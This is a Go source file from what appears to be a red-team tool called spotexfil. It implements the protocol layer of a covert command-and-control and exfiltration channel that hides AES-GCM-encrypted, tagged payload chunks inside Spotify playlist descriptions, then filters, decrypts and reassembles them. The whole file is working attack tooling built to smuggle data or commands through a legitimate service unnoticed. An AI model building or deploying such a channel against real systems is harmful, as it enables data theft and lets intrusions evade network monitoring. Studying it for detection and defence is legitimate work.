package protocol

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"sort"
	"strings"

	"github.com/sourcefrenchy/spotexfil/internal/crypto"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
)

// ComputeC2Tag derives a 12-char hex tag from the encryption key.
// Used to identify C2 playlists without decrypting every playlist.
func ComputeC2Tag(encryptionKey string) string {
	fullHex := crypto.ComputeHMACSHA256Hex(
		[]byte(encryptionKey),
		[]byte(shared.Proto.C2.TagLabel),
	)
	return fullHex[:shared.Proto.C2.TagLen]
}

// DeriveMetaKey derives a fast AES key for metadata encryption.
// Uses HMAC instead of PBKDF2 to avoid per-playlist KDF cost.
func DeriveMetaKey(encryptionKey string) []byte {
	return crypto.ComputeHMACSHA256(
		[]byte(encryptionKey),
		[]byte(shared.Proto.C2.MetaKeyLabel),
	)
}

// chunkEnvelope is the JSON envelope for encrypted chunk descriptions.
type chunkEnvelope struct {
	M map[string]interface{} `json:"m"`
	D string                 `json:"d"`
}

// EncryptChunkDesc encrypts metadata + chunk data into a playlist description.
// Format: c2_tag(12 hex) + base64(nonce(12) || AES-GCM(json({m, d})) + tag(16))
func EncryptChunkDesc(meta map[string]interface{}, chunkData, encryptionKey string) (string, error) {
	tag := ComputeC2Tag(encryptionKey)
	key := DeriveMetaKey(encryptionKey)

	envelope := chunkEnvelope{M: meta, D: chunkData}
	envelopeJSON, err := json.Marshal(envelope)
	if err != nil {
		return "", fmt.Errorf("json marshal envelope: %w", err)
	}

	encrypted, err := crypto.EncryptFast(envelopeJSON, key)
	if err != nil {
		return "", fmt.Errorf("encrypt fast: %w", err)
	}

	encryptedB64 := base64.StdEncoding.EncodeToString(encrypted)
	return tag + encryptedB64, nil
}

// DecryptChunkDesc decrypts a playlist description to extract metadata and chunk.
func DecryptChunkDesc(description, encryptionKey string) (map[string]interface{}, string, error) {
	expectedTag := ComputeC2Tag(encryptionKey)
	tagLen := shared.Proto.C2.TagLen

	if len(description) < tagLen {
		return nil, "", fmt.Errorf("description too short")
	}

	actualTag := description[:tagLen]
	if actualTag != expectedTag {
		return nil, "", fmt.Errorf("C2 tag mismatch")
	}

	encryptedB64 := description[tagLen:]
	raw, err := base64.StdEncoding.DecodeString(encryptedB64)
	if err != nil {
		return nil, "", fmt.Errorf("base64 decode: %w", err)
	}

	key := DeriveMetaKey(encryptionKey)
	plaintext, err := crypto.DecryptFast(raw, key)
	if err != nil {
		return nil, "", fmt.Errorf("decrypt: %w", err)
	}

	var envelope chunkEnvelope
	if err := json.Unmarshal(plaintext, &envelope); err != nil {
		return nil, "", fmt.Errorf("json unmarshal: %w", err)
	}

	return envelope.M, envelope.D, nil
}

// ChunkPayload splits encoded payload into fully encrypted playlist descriptions.
// Each description = c2_tag + encrypted(metadata + chunk_data).
func ChunkPayload(b64Payload string, seq int, channel, encryptionKey string) ([]string, error) {
	effectiveChunk := shared.Proto.C2.EffectiveChunk
	var descriptions []string

	if len(b64Payload) <= effectiveChunk {
		meta := map[string]interface{}{
			"c":   channel,
			"i":   1,
			"seq": seq,
		}
		desc, err := EncryptChunkDesc(meta, b64Payload, encryptionKey)
		if err != nil {
			return nil, err
		}
		descriptions = append(descriptions, desc)
	} else {
		idx := 1
		for i := 0; i < len(b64Payload); i += effectiveChunk {
			end := i + effectiveChunk
			if end > len(b64Payload) {
				end = len(b64Payload)
			}
			part := b64Payload[i:end]
			meta := map[string]interface{}{
				"c":   channel,
				"i":   idx,
				"seq": seq,
			}
			desc, err := EncryptChunkDesc(meta, part, encryptionKey)
			if err != nil {
				return nil, err
			}
			descriptions = append(descriptions, desc)
			idx++
		}
	}

	return descriptions, nil
}

// ReassemblePayload reassembles chunks sorted by index into a single Base64 payload.
func ReassemblePayload(chunkMetas []ChunkMeta) string {
	sort.Slice(chunkMetas, func(i, j int) bool {
		return chunkMetas[i].Index < chunkMetas[j].Index
	})
	var sb strings.Builder
	for _, cm := range chunkMetas {
		sb.WriteString(cm.Data)
	}
	return sb.String()
}

// ChunkMeta holds a chunk's data and its index for reassembly.
type ChunkMeta struct {
	Data  string
	Meta  map[string]interface{}
	Index int
}

// ReadC2Descriptions decrypts and filters C2 playlist descriptions.
// Returns a map of seq -> []ChunkMeta.
func ReadC2Descriptions(descriptions []DescPair, encryptionKey string, channel string, seq int) map[int][]ChunkMeta {
	tag := ComputeC2Tag(encryptionKey)
	seqGroups := make(map[int][]ChunkMeta)

	for _, dp := range descriptions {
		desc := html.UnescapeString(dp.Description)

		// Fast tag check
		if !strings.HasPrefix(desc, tag) {
			continue
		}

		meta, chunkData, err := DecryptChunkDesc(desc, encryptionKey)
		if err != nil {
			continue
		}

		if channel != "" {
			if c, ok := meta["c"]; ok {
				if cs, ok := c.(string); ok && cs != channel {
					continue
				}
			}
		}

		msgSeq := getMetaInt(meta, "seq")
		if seq >= 0 && msgSeq != seq {
			continue
		}

		idx := getMetaInt(meta, "i")
		seqGroups[msgSeq] = append(seqGroups[msgSeq], ChunkMeta{
			Data:  chunkData,
			Meta:  meta,
			Index: idx,
		})
	}

	return seqGroups
}

// DescPair is a playlist ID + description pair.
type DescPair struct {
	PlaylistID  string
	Description string
}

func getMetaInt(m map[string]interface{}, key string) int {
	if v, ok := m[key]; ok {
		switch n := v.(type) {
		case float64:
			return int(n)
		case int:
			return n
		}
	}
	return 0
}
